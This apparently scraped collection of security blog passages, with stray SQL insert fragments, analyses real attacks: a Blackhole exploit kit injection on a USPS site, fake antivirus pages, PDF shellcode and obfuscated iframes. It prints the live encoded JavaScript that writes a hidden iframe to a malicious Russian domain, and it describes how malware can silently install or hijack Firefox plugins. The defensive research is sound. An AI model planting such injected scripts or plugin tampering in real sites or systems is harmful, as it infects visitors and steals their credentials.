A United States Postal Service website (http://ribbs.usps.gov) has been infected with the Blackhole Exploit kit. As we\'ve discussed previously, the Blackhole Exploit kit, a commercial exploit kit developed by Russian hackers, is being seen in an increasing number of attacks. Last week, we reported on how it had been used to infect Worldfest, a Houston, Texas music festival and this week, it has penetrated the website of an independent US government agency, namely that of the postal service. RIBBS stands for Rapid Information Bulletin Board System and deals with Intelligent Mail services, such as barcodes that allow for better tracking and logistics. As with similar infections, the attack follows numerous phases, each being hosted on a separate domain, with each leveraging various obfuscation techniques to hide the attack. Here we will walk through the various phases to detail the attack.    Phase One: Initial Infection    On April, 6th, our attention was drawn to alerts indicating that Zscaler was blocking access to http://ribbs.usps.gov due to the presence of the following encoded Javascript:    <script>  document.write(eval(String.fromCharCode(100,111,99,118,109,101,110,116,46,119,114,105,116,101,40,39,60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,112,114,105,99,104,101,115,111,110,46,104,100,100,49,46,114,117,47,108,111,108,46,112,104,112,34,32,104,101,105,103,104,116,61,34,49,34,32,119,105,100,116,104,61,34,49,34,32,115,116,121,108,101,61,34,100,105,115,112,108,97,121,58,110,111,110,101,34,62,60,47,105,102,114,97,109,101,62,39,41,59)));  </script>      This content uses a simple encoding technique, whereby each letter is encoded as it\'s ASCII equivalent. When decoded, we see the following iframe:    document.write(\'<iframe src=\"http://pricheson.hdd1.ru/lol.php\" height=\"1\" width=\"1\" style=\"display:none\"></iframe>\');      Phase Two: Redirection      The page used in the aforementioned iframe has since been taken offline, presumably by the domain administrator, suggesting that the attackers were simply using an otherwise legitimate site for this stage of the attack. The page was however accessible when the attack was first discovered and contained only the following unencoded iframe:    <script>document.write(\'<iframe src=\"http://oldschool.vv.cc/access7/forum.php?tp=10169-1\" height=\"1\" width=\"1\" style=\"display:none\"></iframe>\');</script>      Phase Three: Attack    It is on this final page, where the attack ultimately takes place. This domain has been known to host other attacks. At the time the attack was first detected, this domain had not been blacklisted by any of the major malicious URL services, but as of today, the majority are now blocking the domain.    This page has been disguised to look like a standard 404 Page Not Found error message, but when viewing the source code, in reality, it is delivering a massive bundle of obfuscated Javascript. When decoded, we see a rather complex logic flow attempting to discern the operating system, web browser type and the existence/absence of components such as Java and ActiveX, in order to determine the appropriate attack payloads to deploy.

Combine that with an abysmal detection rate on the malicious payloads by desktop AV, the first and often only line of client side defense for many enterprises, and we have a potent attack that has no doubt affected many end users.    USPS officials have been informed of the infection and have acknowledged the issue.

One of the techniques used to weed out automated scanning tools from victims using real web browser is JavaScript redirection. I have seen more than ten different techniques to redirect users from the spam page to malware pages leveraging different types of JavaScript. Usually, they use two to four redirections, one after the other, each using different code.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript code of some of the redirections\r\n		\r\n	\r\n\r\nOnce again, by trying too hard to hide the malicious code, Fake AV pages are actually easier to detect by looking at the redirections rather the malicious code itself.\r\n\r\nStrict HTTP Referer\r\n\r\nIn addition to making the JavaScript redirections difficult for security tools to follow, there are strict checks on the HTTP Referer header. For example, a real browser sends a Referer if the redirection is done through an HTTP Location header redirection, a meta redirection, etc., but no referer is sent through when using the JavaScript functions location.assign(new_value) or window.location=new_value. \r\n\r\nIP Blacklisting\r\n\r\nIt usually only requires a few minutes of work to bypass the \"protections\" put in place by Fake AV pages. The fake AV authors have no doubt realized that their modifications were not very effective, and that Zscaler and others are still finding their malicious content.\r\n\r\nA few days after Mike found IP tables settings shared online to block major security vendors, our main IP address was blacklisted. I quickly changed to a different IP address in the same sub-net, but only 3 days later, our complete sub-net was blacklisted. I have recently switched to Tor to get random IP address. This has allowed me to keep tracking new Fake AV pages.\r\n\r\nThe cat and mouse game between Fake AV and the security researchers will probably keep going on for a long time.

Here is the screenshot:                       Unfortunately, for this blog we were unable to retrieve any malicious contents because the iframed site simply redirects to Google.

Here is the packet capture of the redirect:                       The website sets a cookie and redirects to Google.

As I mentioned in the blog, attackers are continually creating new domains and websites promoting their fake software using various obfuscation techniques to hide their code from detection by IDS, IPS, antivirus etc. We have since encountered a number of malicious websites hosted on the same IP address. The main pages of the websites are heavily obfuscated. The structure of obfuscated JavaScript remains the same, throughout, but all variables are random. This likely means that the attacker has created, or is using a tool to handle the code obfuscation. Here are screenshots of the JavaScript code from two different websites:                                      Looking at the above images, you can see that the structure of code remains the same and only the variable names are randomized. Even the source of the page contains only a body tag and the malicious JavaScript. When this page loads, it starts creating animations that deliver security warnings to scare the victim. Here is one example:                                      As I mentioned in the earlier blog post, these are fake security attempting to coerce the victim into downloading fake antivirus software that will download additional malware onto the system. The code for doing these animations and initiating the download of malicious binaries is hidden inside the malicious script. Let’s decode the main script. The malicious JavaScript code has two functions defined and three lines of code to decode the content. Here is how they look:                                      The variable “euqbvulz” is passed in the first iteration to the decoding function “ikcmfynlzk()”. The decoded content is then stored in a variable called “wfuaydtmd”. The “wfuaydtmd” variable is again passed to in a second iteration to a second function called “fiyctdv()” with a “document.write()” function call. So the code will go through two iterations of the decoding. Let’s decode this code using Malzilla.                       Malzilla successfully decoded the contents. But the decoded results contain another three heavily obfuscated JavaScript snippets and some HTML code. Let’s decode them one by one. Here is first one:                       The first malicious JavaScript snippet decodes to the HTML “title” tag, which will be displayed as the title of the webpage, claiming it is a legitimate Windows security website. This means the HTML code displaying warnings and animation is hidden in the remaining malicious scripts. Here is second one:                       The above script code will load the animated images with message “Initializing virus Protection System…”. Here is the third one:                       If you look at the above image, you will notice some strings related to security, which suggests that this JavaScript code actually loads the animation. The first variable is declared as “strategy” so the strategy used by the attacker is to load the variable with JavaScript code in a CSS format. Here are some of the screenshots of that CSS code:                                                                  So, the code displaying the security warnings and messages are obfuscated multiple times by the attacker. You will notice the strings used by the attacker are displayed in warning images mentioned in the first few images.

We have also written in the past about different decoding filters used to hide the malicious code inside PDF files. In this blog, we will examine yet another in the wild PDF exploit which has hidden it’s malicious code under different objects. We will also identify the final payload used to carry out the attack. The malicious PDF sample was retrieved from “hxxp://sj1s.co.cc/games/pdf.php?f=21”. Here is the PDF source code:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe above PDF file is small in size and contains clear text JavaScript. Let’s look at object 1, which contains malicious JavaScript code. This code is very simple to read and understand. The JavaScript accesses some property values declared elsewhere such as “this.producer”, “this.subject” etc. Now, where are those declared values coming from? If you look at the object 3, you will notice that all other variables are accessed from these object properties. The strings used like “eval” and “StringfromCharCode”, suggest this JavaScript is used for malicious purposes. Now, we have 3 different strings from object 3, which will be used in the malicious JavaScript code.\r\n\r\n1) Property Producer contains a long array of values\r\n2) Property Subject contains string “eval”\r\n3) Property Title contains string “StringfromCharCode”\r\n\r\n\r\n\r\nWe will use Malzilla for decoding this malicious JavaScript. For that, we need to substitute the respective values into the variables. We will re-create the JavaScript code for Malzilla using those values to as it with the decoding process. We will need to look at the code carefully, because the array contains some substitution and arithmetic operations. Here is what we need to substitute:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nLet’s take the first value from the Producer property array, which is “t9.5*w”. The malicious JavaScript contains one variable “w”, declared with a value of 4 and then there is another function (axp = axp.replace\\(/t/g,\'2\'\\);), which will replace character “t” with value 2. So the first integer of the array will become (29.5*4) = 118. When we substitute the whole array with values of “t” and “w” we can create the final simple JavaScript code:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nWe will now decode the above simplified code using Malzilla. The decoded content is shown below:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe decoded content contains malicious heap spray code, shellcode and code for attacking different Adobe vulnerabilities. However, we have to yet identify what this malicious code does once it exploits the vulnerability? What payloads does it use for the exploit? For this we need to identify the shellcode used. Here is what the shellcode looks like:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe shellcode used, is in %u Unicode-encoded format. We will convert this code into byte code or executable code for further reversing using IDA pro or OllyDbg. For this, we will use favorite online tool Shellcode 2 EXE. We will copy and paste the shellcode bytes from the variable, which will generate a sample “.exe” file to analyze. Here is the screenshot:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nNow, we have executable file to analyze. So let’s open in IDA pro first to look at the strings used inside the payload. Here are the strings found,\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe string shows that this payload is going to download additional files on the system. Now let’s open this file in OllyDbg for obtaining the malicious URL used inside the payload.\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe shellcode starts with NOP instructions followed by another loop which will decode the malicious code. Look at the instructions above, inside the highlighted box. Those are the instructions which are used to decode everything. By stepping through the code, we come to know that there is an instruction that will compare the value with E9 to exit and another, which is XORing byte with a value of 31. We will put breakpoint at the RETN instruction. The code will successfully run and we will be presented with the decoded content, which contains more interesting strings.\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nLook at the highlighted string above in the dump area. This URL will be used to download another binary from the server. Now, we have identified this malicious payload and the URL used. For reference, here is the result from ThreatExpert for the same shellcode.\r\n\r\n \r\n\r\nThat’s it for now.\r\n\r\n \r\n\r\nUmesh', 'Analysis;Exploit;Malware', 'https://www.zscaler.com/blogs/research/analyzing-pdf-exploits-finding-payloads-used');

The sites convince users to download the malicious software by displaying fake security warnings such as “Your computer is infected” etc. End users are clearly not educated about such attacks, as the campaigns remain highly successful. Below is a short blog analyzing a recent infection on a friend’s machine to illustrate the problem.         We continue to see numerous infected sites, which are redirecting users to fake security software campaigns. The pages display animated fake security warnings to users in order to scare them and convince them to download and install a binary, which is generally packaged as fake antivirus software. The victim will be infected with a downloader Trojan that will then download additional malware. Below are a few screenshots of animations typically used in the attacks:                       After this initial load animation, the user will be prompted with another security warning:                       Once a user clicks on the OK button, additional animated fake security warnings will be displayed.                       At this point, the user is prompted to download the fake antivirus software.                                 This same campaign has been used over and over again and can be found hosted at thousands of domains.                                                    All of the above animations are from the same malicious website. The content is randomly changed for each new visit to the site. Once installed the victim is forced to activate or buy a license key to remove these fake threats from the system. Here are some tips for users who still wants to stay away from those attacks.    1) No real Antivirus vendor displays such security warnings, animations and popups.    2) No website will scan a system when visited and display immediate warnings about threats on the system.    3) No real Antivirus vendor will force you to download an execuatble.    4) When you need AV software, go directly to the site of a reputable vendor yourself.    5) Keep an eye on address bar for the URL name and redirected URL names.    6) Keep any eye on the status bar of the browser, which is present at the bottom to spot redirection taking place.    7) If you want to download executable but are unsure that it is legitimate, it can be scaned against various antivirus vendiors by submitting it to a service such as VirusTotal If popular vendors triggers or declare the file as malicious, immedeatly delete it from the system.    8) Install a common antivirus solution and keep it updated with latest virus definitions.    9) Last but not least, never pay for such fake security software.    The VirusTotal results for the fake security software from the above example show that it was detected by only 21/42 popular AV vendors. Even now, we are still seeing a large number of fake security software websites promoting their fake products.         Stay safe         Umesh', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/fake-security-software-websites-still-popular-2011');

By taking advantage of known/unknown vulnerabilities in web servers or applications, an attacker can inject a malicious Iframe which will point to a malicious domain hosting malware. Attackers continually modify the way they inject malicious Iframes, leveraging various encoding techniques, to hide their malicious code from security products. They also do this to add complexity for security researchers trying to decode the attacks in the first place. Recently, we came across another malicious Iframe attack which was carried out with the help of HTML style tags. Here is the screenshot of an attack found on an infected website:\r\n\r\n \r\n\r\nAttackers have been able to insert a malicious style tag and malicious JavaScript code at the bottom of the page in two separate locations. With the help of some JavaScript code and JavaScript DOM objects and properties, the attacker has injected his obfuscated malicious code. This code is difficult to decode with the help of tools like Malzilla or online services like jsunpack.org. This blog will explain how to decode such malicious hidden Iframes by properly reading the code step by step. Let’s start by formatting the code.\r\n\r\n\r\n\r\n \r\n\r\nThe above code contains one style sheet defined by “#c19”. After further inspection of the code, we determine that variable “WnmaQ” is defined with function “YYSXc()”. After that, there are 3 other variables defined, with 2 of them containing garbage or useless functions and then there is a call to the original function by accessing “Wnmaq.YYSXc()”. This means this code will call the function inside the first defined variable which is “Wnmaq”. Now let’s format that function and break the code into parts so that we can decode it step by step. Here is first part of the script,\r\n\r\n \r\n\r\n\r\n\r\nLooking at the code above, we can see there are some garbage or useless variables and functions are declared for no purpose, such as variable “l”, “v” and function “nB()”. There are many such garbage variables and functions declared throughout the script. They are never used for any significant purpose. So we will skip those dirty useless variables, functions. We will only concentrate on useful variables, code and functions used for decoding this malicious JavaScript. There is variable “g” declared with a “new Date()” function, which is in the form of an array. The first array element is a year and second is a month and so on. Then variable “o” is defined with a “g.getMonth()” function which means variable “o” will contain value “10” which is the second array element and called as month. Then variable “r” will contain the string “from10e”. The value 10 in this variable and is replaced by the “CharCod” string, so finally we have an interesting string in variable “r”, which is nothing but “fromCharCode”. Variable “i” is defined with object “document.styleSheets”, which will return list of style sheets. Let’s decode the second part of the main script,\r\n\r\n\r\n\r\n \r\n\r\nThe above “for()” loop will actually extract the array data from the style tag defined earlier. I have put some comments inside the image to better explain the components of the code. Initially, variable “q” is matched with elements corresponding to the style sheet rule with the help of the “.selectorText” property. If the loop matches the string”#c19” of the style sheet, the code will continue. The next variable “w”, actually retrieves the array from the style sheet rule with the help of the property “.style.backgroundImage”. Now, we finally have useful variables. At this point, we should test to ensure everything seems reasonable. Let’s create a simple “test.html” file and add only important variables, style sheet tags and code inside the HTML file. We will test what the variable “w” will contain after above code with the help of “alert()” function. The sample HTML file is shown below:\r\n\r\n\r\n\r\n \r\n\r\nWe have removed everything and added only those variables which we decoded earlier. We should get array values from style tag. Here is what the variable “w” will contain after running above file.\r\n\r\n\r\n\r\n \r\n\r\nSo, the second part of the script just retrieved values from style tag. This shows our analysis is on the right track. We will keep this “test.html” file as it is and will add more interesting code after additional analysis. Let’s look into next part of the main script:\r\n\r\n\r\n\r\n \r\n\r\nThe above code explains that variable “c” will contain string called “split” and variable “m” will contain array values separated by commas. The variable “k” will contain a value which will be the array length divided by 2. We will add all above 3 lines of code into our “test.html” file and will then alert the value of “k” for our purposes. The variable “k” will contain the value 90 if you run the modified “test.html” file. The above code also contains garbage code as mentioned earlier. Let’s decode the last part of the main script,\r\n\r\n\r\n\r\n \r\n\r\nThe above code is the last part of the main malicious script. Here we will finish the decoding of the code and will come to determine the main malicious code behind this. As analyzed earlier, variable “k” will contain value 90 and this “for()” loop will run 90 times. The function “parseInt()” is used to obtain the exact integer. The variable “o” will contain the month of the date object, which is 10. The variable “r” contains the string “fromCharCode”, which we found earlier. So finally variable “j” will look like,\r\n\r\nj += String[“fromCharCode”][rZ];\r\n\r\nThe loop will continue and variable “j” will be appended with characters retrieved from above expression. This is the main code behind the entire script. The last variable “kW” contains the JavaScript function “eval()” and then there is call to this function with parameter “j”. This tells us that the malicious content will evaluate the code inside the variable “j”. Let’s add this “for()” loop inside our earlier “test.html” file and we will alert the value of “j” to find out the hidden code. This is what our final “test.html code will look like:\r\n\r\n\r\n\r\n \r\n\r\nWe have only added useful variables, loops and JavaScript code in the above file. We have removed useless variables and functions from the main script. Now here is what you see when you run the above file:\r\n\r\n\r\n\r\n \r\n\r\nThe malicious Iframe pointing to malicious domain is finally revealed. The attacker has created the malicious JavaScript code with the help of a style tag to generate a malicious Iframe. This process can be difficult to analyze and tools or services may fail due to the complex nature of the code and various tricks used by attacker. However, if you have a little patience and good eyes, it is very easy to decode such malicious JavaScript code by understanding the flow of the code. That’s it for now.\r\n\r\nHappy Decoding\r\n\r\nUmesh', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/depth-analysis-decoding-html-style-tag-based-malicious-iframes');

Firefox plugins have access to the entire browser, without any restriction. This allowed me to release two plugins to improve the security of Firefox users (Search Engine Security, and BlackSheep), and a third one is in the works, but the power of Firefox plugins can also be used with malicious intent.\r\n\r\nFull access to the browser and the computer\r\n\r\nFirefox plugins have access to the entire browser, including HTTPS content and also to the operating system. This means that any add-on can:\r\n\r\n	see login/password credentials in clear text, even over HTTPS connections\r\n	send back the credentials to any website\r\n	modify the web pages seen by the user (often done by Adware)\r\n	add/delete/modify files on the computer (even outside of the Firefox directory)\r\n	run executables, either embedded in the plugin or downloaded at any point\r\n\r\nThe ability to see content in clear that is sent over HTTPS is unique to browser plugins.\r\n\r\nThere is no concept of permissions or sandboxing for Firefox plugins. Once a user installs a plugin, it has full access to the computer. This is why Firefox imposes a 3-second warning message before you install a plugin. You\'d better be sure you trust it fully!\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Are you really sure you want to install this add-on?\r\n		\r\n	\r\n\r\n\r\nFirefox plugins have been created to steal credentials or insert advertising in web pages.\r\n\r\nNo permissions checks or sandboxing\r\n\r\nGoogle Chrome, on the other hand, requires every plugin to stipulate which domain can be accessed. They are shown to the users before the plugin is installed. It also has more limited capacities, like the inability to listen to all HTTP connections, which ultimately makes Chrome plugins safer, but less versatile.\r\n\r\nFirefox has no restrictions at all on what the a plugin can do, or access. Some versions of Windows or various security tools will ask permission from the user if a plugin access files outside of the Firefox folder, or tries to run an executables. However, this was not the case on my Windows 7 Home version.\r\n\r\nThe only security measure implemented in Firefox is to forbid the installation of plugins from websites other than the official Mozilla site, by default. Users must first allow a domain to install plugins from, then click on \"Install\" after a 3-second wait period.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Plugin installation is blocked by default\r\n		\r\n	\r\n\r\n\r\nOfficial Mozilla add-ons review cycle\r\n\r\nAll add-ons submitted to the official Mozilla Add-Ons site go through a manual source code review. This process attempts to ensure that the plugins are not malicious. Each update of the plugin also goes through a manual review. The down side is that it takes days, or weeks, for every little change to be approved.This is why I prefer to release plugins on our website first and wait until the add-on is stable to submit it to the Mozilla site.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Manual code reviews of Search Engine Security\r\n		\r\n	\r\n\r\nThe only way to be reasonably sure that a plugin is safe is to download it through the official website. There used to be a loop hole, though - add-ons used to be allowed to be listed on the site, but hosted somewhere else. In that case, the official reviewers could not guarantee that code downloaded by the users was the same as what they approved. This option is not available anymore. All add-ons and updates have to be hosted by Mozilla and be listed on their site - that is why BlackSheep is lot listed anymore.\r\n\r\nSilent plugin installation\r\n\r\nWhenever you install a new plugin, it takes effect only after you restart Firefox. Firefox also display a box showing which plugins were newly installed.  However, there are ways to install a plugin silently.\r\n\r\nAn attacker could trick users into downloading a program that would do a silent installation of a malicious plugin in order to get full access to the user surfing data, including login and password information sent over encrypted channels.\r\n\r\nNew add-on\r\n\r\nAll the add-ons are stored under the Firefox profile, a known location, within their own sub-folder. A new folder can be created and filled with a malicious plugin. Firefox keeps information about the existing add-ons in three files: extensions.rdf, extensions.ini and extensions.cache. If any of these file are deleted, Firefox re-builds them automatically at the next start up, without informing the users.\r\n\r\nAfter adding the malicious plugin to the Firefox profile, the three files should deleted. This will not prevent the current Firefox session from running or impact existing plugins. When Firefox is restarted, these files are re-generated, and the new plugin is added to the list without any notification to the user.\r\n\r\nAdd-on overwrite\r\n\r\nEach plugin includes the file install.rdf, which contains metada data about the plugin: name, version, home page URL, etc. The parameter updateURL tells Firefox which URL to use to check for new updates. Malware can simply add or modify the updateURL value for existing add-ons, then remove extensions.rdf. The new updateURL can be used to force the update of a plugin with a version that contains the old add-on plus malicious code.\r\n\r\nWith this technique, the malicious installation is completely invisible.\r\n\r\nThe Firefox plugin framework is very powerful. There are not adequate protections put in place to ensure the integrity of plugins after they are installed. I hope some future version of Firefox will put additional protections in place to avoid tampering of installed plugins.\r\n\r\n-- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/browser-plugins-and-security-considerations');

His second prediction in his list of 10 discussed SSL Only Sites:  In 2011, expect a handful of major vendors to finally tackle this challenge head on and deploy SSL only websites.  Facebook recently announced on their blog that users will have the ability to have all of their transactions encrypted via HTTPS. This is a step in the right direction for protecting your account and your privacy - particularly when using public wifi. I have already blogged about session-id stealing from HTTP transactions (sidejacking), which was further publicized with the release of FireSheep and BlackSheep. Unfortunately, on Facebook, usage of HTTPS is not enabled by default - users still have to enable this setting within their Account Settings page.      There have been a number of security concerns and issues with Facebook- for example,    	Koobface / malicious \"videos\" advertised and spread          	Rogue Facebook Applications - here is a recent rogue \"photo\" app that I saw with relatively poor A/V detection (11/43):        	  		  			  			  		  	      The bad guys are abusing popular web sites/services that users trust. As these sites move to SSL-only versions, while private information may be better protected, any embedded malicious content will be encrypted and potentially invisible from your enterprise\'s IDS/IPS. This is the security paradox that I speak of: moving to HTTPS for all transactions protects against sidejacking and protects user\'s privacy, but this also prevents inspection of network transactions for malicious content ... this is potentially a very scary \"blindspot\" within enterprise environments. This type of \"blindspot\" exists in other services as well, e.g., Gmail.    However, all is not lost- there are several available security avenues for security-conscience organizations that allow Facebook within their environment:    	Host-based protections:  	  		Facebook security apps  		Client anti-virus  		Browser plug-ins  	  	  	SSL-inspection engines:  	  		SSL-proxy with content inspection (appliance or SaaS-based)  	  	    The difficulties with host-based protections include manageability and information feedback (logs). SSL-inspection engines on the other hand, can be easier to manage and provide centralized, aggregated logs (this is particularly true of the SaaS-based models). SSL-inspection does however require the ability to temporarily break \"end-to-end\" encryption which necessitates trusting the proxy and web server certificate validation process. This often causes confusion for management when making the decision on whether to inspect SSL transactions on the network or not.    SSL-inspection engines work by establishing an SSL encrypted session between the web client and proxy, which separately creates a second SSL session between the proxy and the web server. The proxy makes the actual requests to the web server, handles/inspects the received content, and forwards it to the client. In this model the client must trust the certificates from the proxy, and it is important for the proxy to handle certificate verification of the web server.    Zscaler provides SSL-inspection as part of its solution.    Our customers also have the ability to set policy to block transactions to all/or certain social networking sites. Currently, about 16.26% of our customers had transactions that were blocked due to a social networking policy rule.    As Facebook and other popular web services move to SSL-only, enterprises will have a dilemma: (1) accept the risks and rely on host-based protections alone for this content, (2) incorporate SSL-inspection technologies, or (3) incorporate policy enforcement for the sites in question.', 'Analysis', 'https://www.zscaler.com/blogs/research/facebook-and-httpssecurity-paradox');

Among the Egyptian websites that were visited on the 27th, that are no longer accessible include:      	*.masrawy.com (41.178.51.93)  	*.ahram.org.eg  	*.arabia.msn.com (41.178.51.12)  	www.egynews.net -> productnews.link.net (41.178.51.29)  	egypt.usaid.gov (196.219.223.215)  	algomhuria.net.eg  	ahram.org.eg  	*.gov.eg sites    The .eg domains no longer resolve due to the Egyptian nameservers being inaccessible from the Internet outage. There are stories that discuss this DNS outage (here).    On January 27th, prior to the shutdown, this is the breakdown in web surfing activity that was being seen from client traffic originating in Egypt.  The above chart illustrates the Egyptian Internet usage during the protests and leading up to their Internet shutdown. Social media and news related web pages accounted for roughly 65% of the web browsing that was done from Egyptian client IPs through our cloud.    The top sites visited by Egypt web clients on the 27th include:    	Facebook related (42.02% total)  	  		*.facebook.com (25.36%)  		*.fbcdn.net (16.66%)  	  	  	*.aljazeera.net (6.63%)  	Google (6.96%)    The Internet remains dark for nearly all of Egypt to (allegedly) stop what these stats show - the ability to stay up to date with news/events and communicate and share ideas with friends ... after all, information is power. I leave it to the reader to decide whether the end justifies the means, whether this is an acceptable form of \"censorship\" and whether these measures should ever be permissible.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (434, 'Web Transactions Per User Per Day', 'ThreatLabz', 'January 25, 2011', 'I searched the web recently looking for statistics on the average number of web transactions that end-users make per day, and equations for estimating end-user web transactions. I couldn\'t find anything that was worth repeating, so I ran my own numbers from Zscaler data.      First, a quick note on what I\'m defining as a web transaction- all HTTP(S) client requests / server responses. Some web pages have a large number of web transactions associated with a single web page, for example, the cnn.com homepage has 127 transactions:  Other\'s like Google\'s search results pages contain only a few transactions:  I took a random sampling of 100,000 users (excluding group accounts and inactive users) for a 24-hour period on a non-holiday mid-week day. These users are from a global population of enterprise users that typically work an 8-10 hour day. I set a minimum threshold of 500 transactions for an account to be considered an active user - those with less than 500 transactions could be system-driven versus user-driven transactions (e.g., Windows Update), part-time workers, or temporary/test accounts.    The average for this data sample was:  3343.80227 web transactions per user per day     So, within a small organization with 1,000 active users - there are roughly 3.34 million web transactions from the organization\'s user population during a workday. Note: when I originally ran the numbers I included accounts with <500 transactions within the randomly selected user population- these accounted for roughly 14% of the randomly selected user population and brought the average down to 2251 web transactions per user per day. Because it is unlikely that an organization\'s entire user-population will be active at once, it may be important to consider approximately 10% of your organization\'s user-population as inactive.    The maximum number of web transactions from a single user account was 597,064 (this was an outlier). The median (50th percentile) was 1912 web transactions per user per day.      The above plot is the number of users (Y-axis) with a web transaction count between 500 and 4,000 (X-axis) for a 24-hour period. There are a number of users with <1000 transactions in a day, but there is a long \"tail\" to the right of highly active users. Plotting the aggregated user count for web transaction ranges in the thousands (e.g., data point 2 contains the transaction range 2000-2999) with the transaction range in reverse order shows that the curve is roughly exponential (inverse natural log function).    The black trendline that was generated in Excel from our data was:     y = 18293e ^ (-0.267x)  Where,  e is the mathematical constant, 2.71828  x is the transaction range in thousands (e.g., 2 = 2000-2999 transactions)  y is the user population (based on a 100,000 user population) that fall into the \"x\" transaction range    To estimate your user population for a specific transaction range, modify the equation to be:     y = (total_user_population * 0.18293e) ^ (-0.267x)     Using this function it is possible to roughly estimate the number of users that have a specific range of transactions (e.g., power web users) within an organization within a 24-hour period.          A relatively small organization of 300 users must deal with an estimated 1 million web transactions in a 24-hour period for their user population. Some estimates of the 2011 Federal Government payroll state a work-force of 1.35 million Federal civilian employees -- this is an estimated 4.5 billion web transactions a day (this does not include Federal civilian contractors).    These types of numbers are good for an organization to be aware of when considering scaling solutions for enforcing web security / policy and for storing and analyzing transactions.', 'Analysis', 'https://www.zscaler.com/blogs/research/web-transactions-user-day');

I have used this software on-and-off for a few years, and really like it for organizing and interacting with my thoughts when I start a new project. I recently took a look at using the software to organize and visualize web transaction logs for analysis (specifically to extract suspicious / malicious transactions). Below details my experiences - I\'m curious to know what others have found to work.    After exchanging a few emails with TheBrain support (they are very responsive) - they shared a 5-page document on their supported XML formats. A DTD file is available, and is extremely easy to convert your data into \"Thoughts\" and \"Links\" (just make sure to properly handle any XML entities within your data). Thoughts are basically nodes within your mind-map and links can be parent/child or \"jump\" relationships (I think of these as bi-directional \"lookup\" relationships or cross-references). In my case I wrote a Perl script to extract and convert portions of my data into the supported XML format and then imported it into PersonalBrain.  The above is data from 5 transactions imported into the PersonalBrain with these relationships:    	ServerIP, Domain, URLPath, RequestType, Country, ASN, Score, AnalyticCheck, and Transactions are all children of Data, and each has related data under each Thought. For example, 1.2.3.4 falls under ServerIP and China falls under Country.  	ServerIP data has jump links to related ASN, Country, and Domain data and vice versa (the links are bi-directional)  	Domain data has jump links to related URLPaths and vice versa  	Transaction data has related jump links to ServerIP, Domain, URLPath, RequestType, Country, ASN, Score, and AnalyticCheck and vice versa      By having the data in this visual format, it is easy to quickly drill-down and view transactions with higher \"suspicious\" scores and then cross-reference their transaction information with other transactions. You have the ability to view both primary and secondary relationships, similar to what is displayed in the above graph, or a more concise view with just the primary relationships:      Zeus/SpyEye and other bots are often configured to use an IP lookup service (a possible example above) and provide their resolvable IP to the C&C. These types of inter-related transactions can become apparent when correlating botnet web transactions.    I found TheBrain to have a very easy format for converting and importing data to, and to have a very user-friendly, interactive, and fun! interface for working with your imported data. TheBrain includes the ability to \"forget\" and \"remember\" thoughts - i.e., the ability to remove and restore thoughts/links, so while you are conducting your analysis you can clear your brain of any data that is in the way.    What I did find TheBrain woefully inadequate for is large data-sets. When I exported all of the data that I wanted to review for a day, the XML file was 1.66GB for all of the Thoughts and Links. When I tried to import into PersonalBrain on my MacBook Pro (4GB, 2.53GHz Core 2 Duo) I ended up letting it attempt the import overnight ... after about 20 hours of waiting for it to import the data I \"force quit\" the application (though it never said \"not responding\").    If your data-set is of relatively small size, TheBrain may be a good free tool to add to your arsenal.

Many of these sites appear to be affiliate sites (whether authorized or not), but there are malicious sites sprinkled in the results as well...For example, a top scareware site in Alexa is hxxp://antivirus-defender.ru/.  This site shows the typical scareware scanning screen (in Russian):But with one twist- after the fake scanning is completed to scare the victim to purchase / download / install the wares, they are presented with a screen to enter a code that they purchase over SMS in order to download:This translates to English as:Unlike other scareware campaigns where the install is allowed first, and then pop-ups and warnings entice the victim to pay- this campaign preempts payment before installation and payment is done over SMS, which is a bit unique.There are a handful of other malicious A/V sites within the Alexa results as well- e.g., antivirus-scanonline.com (is listed in Alexa and Google Safe Browsing) and virus-scanonline.com (a known malware site which is now dead).

Google was already displaying warnings for some of the hijacked sites, but not all of them. \"This site may harm your computer.\", was already previously displayed by Google for certain sites. In fact, several hijacked sites still have this warning. This particular warning appears for all pages within a potentially compromised domain, including hijacked sites, legitimate pages and spam.

Finally, my biggest disappointment is that this new warning does not help users as much as it could, even if Google fixes the problems described above. When a user clicks on a link that Google showed as \"may harm your computer\", he is redirected to a warning page. Then the user has to enter the URL manually in the browser address bar to actually go the dangerous page. This means that the Referer header does not show \"google.com\", so in most cases the user will not be redirected to the malicious domain. However, when Google shows the new warning, the search result link points directly to the malicious spam page. The Referer shows that the user is coning from a Google search, and the spam page will redirect the user to a malicious domain.    This new warning has the potential to be a significant step forward in the fight against Blackhat spam SEO. More webmasters and more users will be aware of the issues over time, but first, Google has to display the warnings in the right place, below the actual malicious links, and extend their list of hijacked sites.

